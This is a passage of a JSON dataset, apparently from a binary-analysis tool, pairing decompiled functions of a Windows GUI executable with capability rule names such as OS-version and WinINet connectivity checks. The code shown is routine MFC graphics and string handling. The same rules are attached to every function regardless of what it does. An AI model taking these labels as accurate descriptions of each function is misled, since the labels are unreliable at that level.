{
    "14000110": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140001100(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uchar auVar2 [16];\n    uint32_t uVar3;\n    ulong arg1_00;\n    uint32_t *arg2_00;\n    uint32_t *puVar4;\n    uint64_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    uint32_t in_stack_00000040;\n    int32_t in_stack_00000048;\n    uchar auStack216 [8];\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    \n    if (*(arg1 + 0x138) != 0) {\n        if (*(arg1 + 0x11c) == 0) {\n            uVar10 = *(arg1 + 0x150);\n            uVar3 = *(arg1 + 0x154) + (*(arg1 + 0x154) >> 0x1f & 3U) >> 2;\n            puVar4 = *(arg1 + 0x148) + in_stack_00000048 * 4;\n        }\n        else {\n            uVar10 = (*(arg1 + 0x150) >> 0x1f & 3U) + *(arg1 + 0x150) >> 2;\n            uVar3 = *(arg1 + 0x154);\n            puVar4 = *(arg1 + 0x148) + in_stack_00000040 * 4;\n        }\n        auVar2 = ZEXT816(4) * ZEXT416(uVar3 * uVar10);\n        arg1_00 = SUB168(auVar2, 0);\n        if (SUB168(auVar2 >> 0x40, 0) != 0) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        arg2_00 = fcn.1400058bc(arg1_00);\n        puVar6 = *(arg1 + 0x140);\n        if (arg2_00 != NULL) {\n            if (uVar3 != 0) {\n                uVar11 = uVar3;\n                puVar8 = arg2_00;\n                do {\n                    if (in_stack_00000040 < uVar10 + in_stack_00000040) {\n                        uVar5 = (uVar10 + in_stack_00000040) - in_stack_00000040;\n                        do {\n                            uVar9 = *puVar6;\n                            uVar1 = *puVar4;\n                            uVar7 = uVar1 >> 0x18;\n                            if (uVar1 >> 0x18 != 0) {\n                                uVar9 = ((uVar9 & 0xff00) * (0xff - uVar7) + (uVar1 & 0xff00) * uVar7 & 0xff0000 |\n                                        (uVar9 & 0xff00ff) * (0xff - uVar7) +\n                                        ((uVar1 & 0xff) << 0x10 | *(puVar4 + 2)) * uVar7 & 0xff00ff00) >> 8 |\n                                        uVar1 & 0xff000000;\n                            }\n                            *puVar8 = uVar9;\n                            puVar4 = puVar4 + 1;\n                            puVar8 = puVar8 + 1;\n                            puVar6 = puVar6 + 1;\n                            uVar5 = uVar5 - 1;\n                        } while (uVar5 != 0);\n                    }\n                    if (*(arg1 + 0x11c) != 0) {\n                        puVar4 = puVar4 + (*(arg1 + 0x150) - uVar10);\n                    }\n                    uVar11 = uVar11 - 1;\n                } while (uVar11 != 0);\n            }\n            fcn.1400056a0(auStack216, arg2);\n            fcn.140004900(auStack216, arg2_00, 0, uVar10);\n            uStack208 = 0;\n            uStack200 = CONCAT44(uVar3, uVar10);\n            uStack192 = 0;\n            uStack184 = CONCAT44(uVar3, uVar10);\n            fcn.1400057e0(auStack216);\n            fcn.1400058b4(arg2_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 1011
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "14000160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140001600(int64_t arg1)\n\n{\n    int64_t arg1_00;\n    int64_t *piVar1;\n    ulong uVar2;\n    \n    uVar2 = 0xfffffffffffffffe;\n    if (*(arg1 + 0x160) == 0) {\n        arg1_00 = fcn.140005870(0xe0);\n        if (arg1_00 == 0) {\n            piVar1 = NULL;\n        }\n        else {\n            piVar1 = fcn.14000feb8(arg1_00);\n        }\n        *(arg1 + 0x160) = piVar1;\n        (**(*piVar1 + 0x278))(piVar1, arg1, 0);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(*(arg1 + 0x160) + 0x40), 0x401, 1, 0, uVar2);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "14000202": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140002020(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    \n    iVar5 = *arg1;\n    piVar3 = *(iVar5 + -0x18);\n    if (*(iVar5 + -0x10) != 0) {\n        if (*(iVar5 + -8) < 0) {\n            if (*(iVar5 + -0xc) < 0) {\n                fcn.140001010(0x80070057);\n                pcVar4 = swi(3);\n                (*pcVar4)();\n                return;\n            }\n            *(iVar5 + -0x10) = 0;\n            **arg1 = 0;\n            return;\n        }\n        LOCK();\n        piVar1 = iVar5 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 + -1 < 1) {\n            (**(**(iVar5 + -0x18) + 8))();\n        }\n        iVar5 = (**(*piVar3 + 0x18))(piVar3);\n        *arg1 = iVar5 + 0x18;\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "1400020a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.1400020a0(int64_t *arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint64_t arg2_00;\n    int32_t iVar8;\n    uint64_t uVar9;\n    \n    uVar9 = arg2;\n    iVar6 = *arg1;\n    if (arg2 < *(iVar6 + -0x10)) {\n        uVar9 = *(iVar6 + -0x10);\n    }\n    iVar8 = uVar9;\n    if (1 < *(iVar6 + -8)) {\n        iVar6 = *arg1;\n        iVar2 = *(iVar6 + -0x10);\n        puVar4 = (**(**(iVar6 + -0x18) + 0x20))();\n        iVar5 = (***puVar4)(puVar4, uVar9, 1);\n        if (iVar5 == 0) {\n            fcn.140001420();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        if (iVar2 < iVar8) {\n            iVar8 = iVar2;\n        }\n        fcn.14001af18(iVar5 + 0x18, iVar8 + 1, iVar6, iVar8 + 1);\n        *(iVar5 + 8) = iVar2;\n        LOCK();\n        piVar1 = iVar6 + -8;\n        iVar8 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar8 + -1 < 1) {\n            (**(**(iVar6 + -0x18) + 8))(*(iVar6 + -0x18), iVar6 + -0x18);\n        }\n        *arg1 = iVar5 + 0x18;\n        return;\n    }\n    iVar2 = *(iVar6 + -0xc);\n    if (iVar2 < iVar8) {\n        if (0x400 < iVar2) {\n            iVar7 = iVar2 + 0x400;\n            if (iVar2 + 0x400 < iVar8) {\n                iVar7 = iVar8;\n            }\n            if ((*(*arg1 + -0xc) < iVar7) && (0 < iVar7)) {\n                iVar6 = (**(**(*arg1 + -0x18) + 0x10))();\n                if (iVar6 == 0) {\n                    fcn.140001420();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                *arg1 = iVar6 + 0x18;\n                return;\n            }\n            fcn.140001420();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        arg2_00 = iVar2 * 2;\n        if (iVar2 * 2 < iVar8) {\n            arg2_00 = uVar9;\n        }\n        fcn.1400014e0(arg1, arg2_00);\n    }\n    return;\n}\n",
        "token_count": 697
    },
    "14000210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140002100(int64_t **arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t **ppiVar3;\n    \n    piVar2 = (**(**arg1 + 0x20))();\n    if ((-1 < *(arg1 + 2)) && (piVar2 == *arg1)) {\n        LOCK();\n        *(arg1 + 2) = *(arg1 + 2) + 1;\n        return arg1;\n    }\n    ppiVar3 = (***piVar2)(piVar2, *(arg1 + 1), 1);\n    if (ppiVar3 == NULL) {\n        fcn.140001420();\n        pcVar1 = swi(3);\n        ppiVar3 = (*pcVar1)();\n        return ppiVar3;\n    }\n    *(ppiVar3 + 1) = *(arg1 + 1);\n    fcn.14001af18(ppiVar3 + 3, *(arg1 + 1) + 1, arg1 + 3, *(arg1 + 1) + 1);\n    return ppiVar3;\n}\n",
        "token_count": 257
    },
    "14000248": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140002480(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t **arg1_00;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t **ppiVar5;\n    \n    iVar4 = *arg2;\n    iVar3 = *arg1;\n    arg1_00 = iVar4 + -0x18;\n    ppiVar5 = iVar3 + -0x18;\n    if (arg1_00 != ppiVar5) {\n        if ((-1 < *(iVar3 + -8)) && (*arg1_00 == *ppiVar5)) {\n            iVar4 = fcn.140002100(arg1_00);\n            LOCK();\n            piVar1 = iVar3 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**ppiVar5 + 8))(*ppiVar5, ppiVar5);\n            }\n            *arg1 = iVar4 + 0x18;\n            return arg1;\n        }\n        fcn.1400022f0(arg1, iVar4, *(iVar4 + -0x10));\n    }\n    return arg1;\n}\n",
        "token_count": 299
    },
    "14000254": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140002540(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    code *pcVar4;\n    uint16_t uVar5;\n    int64_t *piVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t iStackX8;\n    \n    iVar2 = arg4;\n    uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg1 + 0x40), 0xfffffff0);\n    if ((uVar5 & 0xb) == 0) {\n        arg4 = 1;\n        (*_sym.imp.USER32.dll_SendMessageA)(*(arg1 + 0x40), 0xf4);\n    }\n    *(arg1 + 0x148) = 0;\n    piVar6 = fcn.14000fd70();\n    if (piVar6 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar4 = swi(3);\n        uVar7 = (*pcVar4)();\n        return uVar7;\n    }\n    iStackX8 = (**(*piVar6 + 0x18))(piVar6);\n    iStackX8 = iStackX8 + 0x18;\n    fcn.140002510(&iStackX8, 0x14002deb4, arg2, arg4);\n    iVar8 = fcn.140006c48();\n    uVar7 = *(iVar8 + 0x18);\n    iVar9 = fcn.140006c48();\n    iVar8 = iStackX8;\n    uVar3 = *(iVar9 + 0x18);\n    (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar7, iStackX8);\n    iVar9 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar3);\n    if (iVar9 == 0) {\n        LOCK();\n        piVar1 = iVar8 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 + -1 < 1) {\n            (**(**(iVar8 + -0x18) + 8))();\n        }\n        uVar7 = 0;\n    }\n    else {\n        iVar9 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar9);\n        *(arg1 + 0x148) = iVar9;\n        if (iVar9 == 0) {\n            LOCK();\n            piVar1 = iVar8 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iVar8 + -0x18) + 8))();\n            }\n            uVar7 = 0;\n        }\n        else {\n            *(arg1 + 0x150) = arg3;\n            *(arg1 + 0x154) = iVar2;\n            if (*(arg1 + 0x11c) == 0) {\n                *(arg1 + 0xf0) = iVar2 + (iVar2 >> 0x1f & 3U) >> 2;\n                *(arg1 + 0xec) = arg3;\n            }\n            else {\n                *(arg1 + 0xf0) = iVar2;\n                *(arg1 + 0xec) = arg3 + (arg3 >> 0x1f & 3U) >> 2;\n            }\n            fcn.140007d10(arg1, 0, 0, 0);\n            LOCK();\n            piVar1 = iVar8 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**(iVar8 + -0x18) + 8))();\n            }\n            uVar7 = 1;\n        }\n    }\n    return uVar7;\n}\n",
        "token_count": 905
    },
    "14000be4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000be40(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 299
    },
    "1400029e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400029e0(int64_t arg1, int64_t *pvarg, ulong arg3)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    uchar auStack32 [24];\n    \n    iVar2 = *pvarg;\n    if (*(iVar2 + -0x10) == 0) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iVar2 + -0x18) + 8))();\n        }\n    }\n    else {\n        fcn.140001600(arg1);\n        fcn.140002480(arg1 + 0x158, pvarg);\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(*(arg1 + 0x160) + 0x40), 0x40d, 0, 0);\n        if (iVar3 == 0) {\n            (*_sym.imp.USER32.dll_GetClientRect)(*(arg1 + 0x40), auStack32);\n            fcn.140010284(*(arg1 + 0x160), arg1, *(arg1 + 0x158), auStack32);\n        }\n        fcn.140010324(*(arg1 + 0x160), *(arg1 + 0x158), arg1, 1);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(*(arg1 + 0x160) + 0x40), 0x403, 0, 2000);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(*(arg1 + 0x160) + 0x40), 0x401, arg3, 0);\n        iVar2 = *pvarg;\n        LOCK();\n        piVar1 = iVar2 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 + -1 < 1) {\n            (**(**(iVar2 + -0x18) + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 487
    },
    "14001386": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140013864(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    *arg1 = vtable.CDialog.0;\n    if (arg1[8] != NULL) {\n        fcn.14000b6d8(arg1);\n    }\n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 337
    },
    "140002f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140002f10(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = *arg1;\n    while (iVar1 != 0) {\n        arg1 = arg1 + 1;\n        iVar2 = iVar2 + 1;\n        iVar1 = *arg1;\n    }\n    return iVar2;\n}\n",
        "token_count": 95
    },
    "1400036f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400036f0(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    ushort *arg1_00;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint64_t uVar5;\n    uchar auStack200 [8];\n    ulong uStack192;\n    ulong uStack168;\n    uchar auStack160 [8];\n    ulong uStack152;\n    uint8_t uStack74;\n    ulong uStack64;\n    uint32_t uStack56;\n    uint uStack24;\n    uint uStack16;\n    \n    if (*(arg2 + 8) != 0) {\n        uStack64 = 0x140003716;\n        fcn.14000780c(arg2);\n    }\n    if (*(arg3 + 8) != 0) {\n        uStack64 = 0x140003725;\n        fcn.14000780c(arg3);\n    }\n    uStack64 = 0x14000372a;\n    iVar2 = fcn.140006c48();\n    uStack16 = 0x2000;\n    uStack24 = 0;\n    uStack64 = 0x14000374d;\n    iVar2 = (*_sym.imp.USER32.dll_LoadImageA)(*(iVar2 + 0x10), arg1, 0, 0);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uStack64 = 0x14000376d;\n    fcn.1400077d0(arg2, iVar2);\n    uStack168 = 0xfffffffffffffffe;\n    (*_sym.imp.GDI32.dll_GetObjectA)();\n    if (uStack56 == 0) {\n        uStack56 = 1 << (uStack74 & 0x1f);\n    }\n    fcn.1400075c0(&stack0xffffffffffffff60, 0);\n    if (uStack56 < 0x101) {\n        uVar1 = SUB168(ZEXT816(4) * ZEXT816(uStack56), 0);\n        if (SUB168(ZEXT816(4) * ZEXT816(uStack56) >> 0x40, 0) != 0) {\n            uVar1 = 0xffffffffffffffff;\n        }\n        iVar2 = fcn.1400058bc(uVar1);\n        fcn.140006f44(&stack0xffffffffffffff38);\n        uVar1 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uStack152);\n        fcn.1400074fc(&stack0xffffffffffffff38, uVar1);\n        fcn.1400078a4(uStack192, *(arg2 + 8));\n        (*_sym.imp.GDI32.dll_GetDIBColorTable)(uStack192, 0, uStack56, iVar2);\n        arg1_00 = fcn.1400058bc(uStack56 * 4 + 8);\n        *arg1_00 = 0x300;\n        arg1_00[1] = uStack56;\n        if (0 < uStack56) {\n            puVar3 = arg1_00 + 5;\n            puVar4 = iVar2 + 1;\n            uVar5 = uStack56;\n            do {\n                puVar3[-1] = puVar4[1];\n                *puVar3 = *puVar4;\n                puVar3[1] = puVar4[-1];\n                puVar3[2] = 0;\n                puVar4 = puVar4 + 4;\n                puVar3 = puVar3 + 4;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        uVar1 = (*_sym.imp.GDI32.dll_CreatePalette)(arg1_00);\n        fcn.1400077d0(arg3, uVar1);\n        fcn.1400058b4(arg1_00);\n        fcn.1400058b4(iVar2);\n        fcn.140007598(&stack0xffffffffffffff38);\n    }\n    else {\n        uVar1 = (*_sym.imp.GDI32.dll_CreateHalftonePalette)(uStack152);\n        fcn.1400077d0(arg3, uVar1);\n    }\n    fcn.140007624(&stack0xffffffffffffff60);\n    return 1;\n}\n",
        "token_count": 966
    },
    "14001496": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140014960(int64_t arg1, ulong arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t aiStackX24 [2];\n    \n    if (*(arg3 + 0x40) != 0) {\n        return;\n    }\n    iVar4 = fcn.140007a18(arg3);\n    if (iVar4 != 0) {\n        return;\n    }\n    fcn.14001490c(arg1, arg2);\n    fcn.140007ab8(*(arg1 + 8), arg2, aiStackX24);\n    if (aiStackX24[0] != 0) {\n        iVar3 = fcn.14000c294(arg3, aiStackX24[0]);\n        if (iVar3 == 0) {\n            fcn.140005e0c();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (aiStackX24[0] != 0) {\n            iVar4 = *(arg1 + 8);\n            iVar2 = (*_sym.imp.USER32.dll_GetParent)(*(arg3 + 0x40));\n            if (*(iVar4 + 0x40) == iVar2) {\n                return;\n            }\n            goto code_r0x000140014a00;\n        }\n    }\n    iVar4 = fcn.140007a58(*(arg1 + 8));\n    if (iVar4 == 0) {\n        return;\n    }\n    iVar4 = *(arg1 + 8);\ncode_r0x000140014a00:\n    fcn.140007cdc(arg3, iVar4);\n    return;\n}\n",
        "token_count": 386
    },
    "140003bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003bf0(code **hdcDest)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    code *hgdiobj;\n    ulong uVar3;\n    uint64_t in_stack_ffffffffffffffd0;\n    \n    *hdcDest = vtable.CMemDC.0;\n    if (*(hdcDest + 10) == 0) {\n        hdcDest[2] = NULL;\n        hdcDest[1] = NULL;\n    }\n    else {\n        uVar1 = *(hdcDest + 0x44);\n        iVar2 = *(hdcDest + 8);\n        (*_sym.imp.GDI32.dll_BitBlt)\n                  (*(hdcDest[7] + 8), iVar2, uVar1, *(hdcDest + 9) - iVar2, *(hdcDest + 0x4c) - uVar1, hdcDest[1], iVar2\n                   , in_stack_ffffffffffffffd0 & 0xffffffff00000000 | uVar1, 0xcc0020);\n        hgdiobj = hdcDest[6];\n        if (hgdiobj != NULL) {\n            hgdiobj = *(hgdiobj + 8);\n        }\n        fcn.1400078a4(hdcDest[1], hgdiobj);\n    }\n    hdcDest[4] = vtable.CBitmap.0;\n    fcn.140002730(hdcDest + 4);\n    *hdcDest = vtable.CDC.0;\n    if (hdcDest[1] != NULL) {\n        uVar3 = fcn.140007548(hdcDest);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "14000759": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
